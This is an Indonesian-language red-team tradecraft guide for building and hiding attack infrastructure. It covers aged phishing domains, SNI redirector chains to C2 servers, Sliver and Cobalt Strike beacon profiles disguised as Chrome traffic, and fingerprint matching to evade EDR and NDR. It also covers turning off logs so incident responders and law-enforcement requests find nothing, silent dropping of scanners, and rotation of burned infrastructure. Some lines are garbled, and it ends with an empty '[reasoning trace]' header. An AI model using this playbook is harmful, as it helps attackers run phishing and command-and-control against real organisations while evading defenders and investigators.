# opsec-tradecraft — opsec

# Red Team OPSEC: Infrastruktur Terpisah, Domain Aging, Redirector Chain, Fingerprint Matching, Logging Minimal, Tradecraft Harian

## 1. Prinsip Pemisahan Infrastruktur

| Aset | Kegunaan | Atribut wajib | Tidak boleh dipakai untuk |
|---|---|---|---|
| Phishing infra | Halaman credential harvest / payload staging | Domain kategorisasi "Business/Finance", TLS valid (Let's Encrypt / ZeroSSL), email SPF/DKIM/DMARC aligned | C2 callback, beaconing |
| C2 infra | Long-haul beacon | Tanpa web UI publik, tanpa mail record, sertifikat self-signed atau LE wildcard terpisah | Phishing, redirect dari klik massal |
| Redirector | Front-end traffic (HTTPS ke C2) | IP VPS bersih, domain aged, HAProxy/nginx stream | Menyimpan payload, hosting halaman |
| Staging | Serve payload sekali pakai | Subdomain unik per campaign, TTL pendek | Beacon callback |
| Admin/VPN | Operasi operator | WireGuard, IP allowlist, MFA | Menyentuh target langsung |

Aturan tunggal: **satu IP/domain/sertifikat tidak pernah menyentuh dua peran**. Kebocoran = satu infra ter-burn, satu kampanye mati.

## 2. Domain Aging & Kategorisasi

**Timeline minimum (lapangan):**

| Umur | Status | Kegunaan |
|---|---|---|
| 0–7 hari | Baru, belum kategorisasi | Parkir saja, jangan kirim email |
| 7–30 hari | Submit kategorisasi (Bluecoat, Fortiguard, Symantec, Google Safe Browsing) | Landing page dummy |
| 30–90 hari | Reputasi netral terbentuk | Redirector, phishing ringan |
| >90 hari | Siap untuk kredensial | Phishing penuh |

**Cek kategorisasi:**
```bash
# Palo Alto / BrightCloud
curl -s "https://urlfiltering.paloaltonetworks.com/api/query?url=https://target.example" 
# Symantec SiteReview (manual via browser)
# Fortiguard
curl -s "https://www.fortiguard.com/iprep?input=1.2.3.4&version=8"
# VirusTotal domain via API v3
curl -s -H "x-apikey: $VT" "https://www.virustotal.com/api/v3/domains/target.example" | jq '.data.attributes.categories, .data.attributes.reputation'
```

**Kenapa gagal:**
- Domain <30 hari + email → banyak gateway (Mimecast, Proofpoint) tahan atau quarantine karena *age signal*.
- Sertifikat freshly-issued Let's Encrypt (<24 jam) sering dianggap "suspicious new cert" oleh Cisco Umbrella.
- Domain tanpa MX + SPF tapi dipakai kirim email = instant spam score.

## 3. Redirector Chain

**Arsitektur:** target → domain aged (redirector front) → TLS termination (nginx 1.25 `stream` atau HAProxy 2.9) → backend C2 (IP berbeda, ASN berbeda).

**nginx 1.25 L4 redirector dengan SNI routing:**
```nginx
# /etc/nginx/nginx.conf — stream block
stream {
    map $ssl_preread_server_name $backend {
        cdn.example-aged.com   10.10.10.10:443;   # phishing backend
        mail.example-aged.com  10.10.10.11:443;   # staging
        default                10.10.10.12:443;   # C2
    }
    server {
        listen 443;
        proxy_pass $backend;
        ssl_preread on;
        proxy_timeout 300s;
        proxy_connect_timeout 5s;
    }
}
```

**Chained 3-hop (target → CDN aged → VPS redirector → C2):**

| Hop | Komponen | Transport | Detectability |
|---|---|---|---|
| 1 | Cloudflare/CloudFront domain aged | HTTPS 443 | Rendah; TLS cert LE wildcard |
| 2 | VPS redirector HAProxy 2.9 | TLS passthrough | Sedang; IP VPS ASN umum (Hetzner/Vultr) |
| 3 | C2 (Sliver 1.5 / Mythic 3.2 / Cobalt Strike 4.10) | mTLS atau HTTPS | Rendah jika profil matching (lihat §5) |

**HAProxy 2.9 (sama effect, lebih bersih log):**
```
frontend tls_in
  bind *:443
  mode tcp
  tcp-request inspect-delay 5s
  tcp-request content accept if { req_ssl_hello_type 1 }
  use_backend phish  if { req_ssl_sni -i cdn.example-aged.com }
  use_backend c2     if { req_ssl_sni -i mail.example-aged.com }
  default_backend c2
```

**Kenapa berhasil:** SNI passthrough tidak terminasi TLS di redirector → cert backend tidak terekspos ke proxy logging middlebox. **Kenapa gagal:** redirector di ASN yang sama dengan C2 → sekali IP redirector diketahui, pivot ke C2 via netflow (shared ASN + temporal correlation).

## 4. Sinkronisasi User-Agent & JA3

**Masalah:** C2 callback dengan UA `python-requests/2.31` atau JA3 default Go biasanya di-drop EDR/NDR modern (Darktrace, ExtraHop, Corelight). C2 headless di run host standar (Ubuntu 24.04) memancarkan TLS fingerprint unik.

**Target baseline yang wajib ditiru (Chrome 131 / Windows 11 24H2):**

| Field | Nilai referensi |
|---|---|
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36` |
| JA3 hash | `cd08e31494f9531f560d64c695473da9` (Chrome 128+, cipher order BoringSSL) |
| JA3S | sesuaikan dengan nginx 1.25 `ssl_protocols TLSv1.2 TLSv1.3`, cipher list Chrome-order |
| HTTP/2 SETTINGS | `INITIAL_WINDOW=65535`, `MAX_FRAME=16384`, `HEADER_TABLE=65536` (Chrome default) |
| Header order | `Host, Connection, sec-ch-ua, sec-ch-ua-mobile, sec-ch-ua-platform, Upgrade-Insecure-Requests, User-Agent, Accept, Sec-Fetch-*` |

**Profil Sliver 1.5 `mTLS` (fase development):**
```
sliver > profiles new --mtls 1.2.3.4:443 \
  --format shellcode \
  --skip-symbols \
  --max-errors 5 \
  --reconnect 60s \
  --poll-timeout 360s \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" \
  chrome131
```

**Cobalt Strike 4.10 malleable profile (potongan):**
```
http-get {
    set uri "/updates/check client/2.31.5.0";
    client {
        header "Host" "cdn.example-aged.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.9";
        header "sec-ch-ua" "\"Chromium\";v=\"131\",\"Not_A Brand\";v=\"24\"";
        parameter "v" "2.31.5.0";
        metadata { base64url; prepend "s="; print; }
    }
    server { header "Content-Type" "text/html"; output { prepend "<html>"; append "</html>"; print; } }
}
stage {
    set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
    set keystore "/etc/cs/c2.jks"; set password "…";
    set sleeptime "60000";   # 60s beacon
    set jitter "40";
}
```

**Verifikasi JA3 lokal sebelum deploy:**
```bash
# pakai tlsfingerprint / ja3 via tshark
tshark -r /tmp/c2_test.pcap -Y "tls.handshake.type==1" \
  -T fields -e ip.dst -e tcp.dstport -e tls.handshake.ja3 2>/dev/null
# output harus sama dengan baseline Chrome 131 yang kamu rekam sendiri
```

**Kenapa gagal:**
- UA Chrome 131 tapi JA3 milik Go (`18a4d79ef8...`) → mismatch langsung alert di NDR.
- Chrome 131 diklaim tapi HTTP/2 SETTINGS Go → header `X-Forwarded-For` di proxy vhost frontend mengungkap origin.
- Beacon 60s + jitter 40% selama >8 jam dari satu IP target = anomali temporal di NetFlow.
- Sertifikat TLS dengan `subjectAltName=*.example.com` (wildcard) tapi hanya hit 1 hostname → "pre-login SNI mismatch" heuristics.

## 5. Logging Minimal

**Prinsip:** setiap hop, log hanya yang dibutuhkan forensik internal — tidak ada yang bisa di-pivot ke identitas operator.

**nginx 1.25 — matikan access log spesifik vhost, biarkan error ke `/dev/null`:**
```nginx
server {
    listen 443 ssl http2;
    server_name cdn.example-aged.com;
    access_log off;
    error_log /dev/null crit;
    ssl_certificate     /etc/letsencrypt/live/cdn.example-aged.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.example-aged.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384";
    location / { proxy_pass https://10.10.10.12:443; proxy_ssl_server_name on; }
}
```

**Filter drop untuk probe scanner (iptables/nftables) — jangan log, drop diam-diam:**
```bash
nft add table inet redir
nft add chain inet redir input '{ type filter hook input priority 0; }'
nft add rule inet redir input tcp dport 443 ct state new \
  ip saddr @tor_exits drop
nft add rule inet redir input tcp dport 443 \
  tcp flags & (fin|syn|rst|psh|ack|urg) == 0x0 drop    # XMAS scan
nft add rule inet redir input tcp dport 443 \
  tcp flags & (syn|fin) == (syn|fin) drop             # SYN+FIN
nft add rule inet redir input tcp dport 443 \
  ip frag-off & 0x1fff != 0 drop                       # frag
```

**Redirector HAProxy — `log global` tapi tanpa `option httplog` di frontend TCP:**
```
global
  log /dev/log local0 notice
defaults
  log global
  option  dontlognull
  timeout client 30s
  timeout server 30s
frontend tls_in
  bind *:443
  mode tcp
  option tcplog         # hanya L4: src IP, dst IP, duration, bytes
  # JANGAN: option httplog / capture request header
```

**C2 (Sliver) — redam console history operator:**
```bash
export HISTCONTROL=ignorespace
unset HISTFILE
# jalankan sliver client di dalam tmux + script(1) di /dev/null
```

**Kenapa gagal:**
- `access_log` default nginx → `$remote_addr $http_user_agent` outbound ke syslog eksternal operator sendiri = log berisi IP target muncul di infra yang dapat di-request oleh IR.
- Debug logging Cobalt Strike di `/opt/cobaltstrike/logs/` persist >30 hari dan sering tertinggal di snapshot VPS.
- `capture request header` di HAProxy meng-expose beacon pattern ke log.
- Cloudflare default logs (jika pakai CF) menahan 72 jam dan dapat dilaw enforcement request — hindari CF untuk C2, pakai VPS langsung.

## 6. Tradecraft Harian Operator

| Aktivitas | Aturan operasional | Artefak konkret |
|---|---|---|
| Sinkronisasi jam | NTP wajib; skew >5s = beacon timing anomaly | `chronyc tracking \| grep "System time"` |
| Rotasi infra | Ganti IP redirector setiap 7 hari atau setelah 1 event "honeytoken hit" | Catat last-rotation di ops log |
| Sesi shell | `TERM=xterm-256color`, `PS1` diseragamkan per host | Jangan biarkan `root@ip-#` di screenshot |
| File transfer | Gunakan staged upload saja; larang `wget`/`curl` ke Multh | Aset hanya lewat staging vhost |
| Komunikasi tim | Signal/Matrix E2E; larang channel yang menyebut target name | Enkode target ID (`T-042`) di log harian |
| Burn protocol | Jika C2 callback terdeteksi (EDR kill), tunggu 72 jam sebelum re-deploy profil | Hitung "cool-down window" |
| Catatan | Ops log di host bukan di laptop; rotasi mingguan; disk LUKS | GPG encrypt log sebelum upload |
| Beacon hygiene | Sleeptime min 45s; jitter 30–50%; hindari jam 02:00–04:00 UTC (batch IR) | `set sleeptime 60000; set jitter 40;` |
| Host compromise log | Disimpan di VPS *terpisah* dari infra C2 | Satu VPS "journal" saja |
| Kill switch | DNS/hetzner API token simpan di password manager; rotate per campaign | Siap drop redirector <5 menit |

**Perintah rotasi redirector (Hetzner Cloud API 1.44):**
```bash
# snapshot dulu, lalu recreate
hcloud server create --name redir-$(date +%s) --type cx22 --image ubuntu-24.04 \
  --location hel1 --ssh-key ops-key
# tunggu 90s, jalankan ansible playbook: nginx L4 + nftables + cert LE
ansible-playbook -i /etc/ansible/redir_hosts rotasi_redir.yml -e "backend_ip=10.10.10.12"
```

## 7. Checklist Harian (cetak, tempel di monitor)

- [ ] Sinkron NTP <1s (`chronyc tracking | grep "System time"`)
- [ ] Redirector aktif, SNI mapping benar (`openssl s_client -servername cdn.example-aged.com -connect 1.2.3.4:443 </dev/null 2>/dev/null | openssl x509 -noout -subject`)
- [ ] C2 beacon fingerprint == baseline Chrome 131 (validasi JA3 via tshark)
- [ ] UA backend == UA baseline; tidak ada `python-requests`, `curl/*`, `Go-http-client`
- [ ] `access_log off` pada vhost phishing & redirector aktif
- [ ] IP admin/VPN masih allowlist di firewall redirector
- [ ] Phishing domain: cek VT reputation <3 deteksi, kategorisasi != "Suspicious/Phishing"
- [ ] Zona waktu payload (mis. `timedatectl`) sesuai target geografi
- [ ] Ops log terisi tiap sesi; nama target disandikan `T-NNN`
- [ ] Tidak ada credential target tersimpan plaintext di VPS C2
- [ ] Kill switch (API token) dirotasi sejak hari sebelumnya
- [ ] Beacon cooldown pasca-burn ≥72 jam tercatat

## Jebakan Operasional yang Membuat Semua Ini Gagal

1. **Satu IP untuk phishing + C2.** Saat IR target melihat one drive-by, mereka pull PCAP C2 dalam jam yang sama; redirector jadi pivot ke C2 & operator IP.
2. **Domain aged tapi cert LE baru.** Bluecoat kategorisasi pakai snapshot domain; cert baru (<24 jam) tapi domain 90 hari = red flag kombinasi. Isi cert minimal 72 jam sebelum dipakai.
3. **JA3 dicocokkan tapi HTTP/2 fingerprint beda.** Chrome 131 UA + JA3 Chrome tapi SETTINGS Go = deteksi. Uji dengan `curl --http2` ke servermu sendiri, bandingkan dengan capture Chrome 131 asli.
4. **Redirector `proxy_ssl_server_name on` dengan cert backend self-signed.** SNI backend non-matching → alert di middlebox. Selalu gunakan LE cert valid pada backend C2, jangan self-signed, kalau perlu mTLS untuk otentikasi.
5. **Log nginx Active lalu dikirim `remote_syslog` ke host operator.** IR melihat beacon pattern di log operator = full OPSEC collapse. `access_log off` wajib di layer pertama.
6. **Beacon 20s pada jam kerja target.** Darktrace/Huntress cover traffic anomaly kecil pakai statistical baseline; 20s + jitter 10% adalah pola "C2 botnet 2015". 45–60s dengan jitter 40% realistic.
7. **`stealth` diaktifkan di Cobalt Strike 4.10 tapi profile malleable tidak sinkron.** CS `stealth` + HTTP GET profile standar = traffic shape mismatch dari apa yang dikirim profil; uji out of the box.
8. **VPS provider sama untuk 3 hop.** Hetzner + Hetzner + Hetzner = ASN correlation trivial. Minimal satu hop di ASN berbeda (mis. DigitalOcean → Vultr → Hetzner).
9. **Redirector dipakai setelah honeytoken metric alert.** Satu klik dari IP analis (mis. honeypot vendor) = infra burn. Selalu cek hit dari range vendor IR (`185.x`, `20.x` Microsoft) sebelum scaling.
10. **Operator history `~/.bash_history` di laptop bersih tapi `~/.sliver/logs/` masih ada.** CS/Sliver client simpan log sesi di home; packs-lah ke LUKS atau swap ke `--no-save` (Sliver 1.5: `sliver --no-save`).

---

## [reasoning trace]


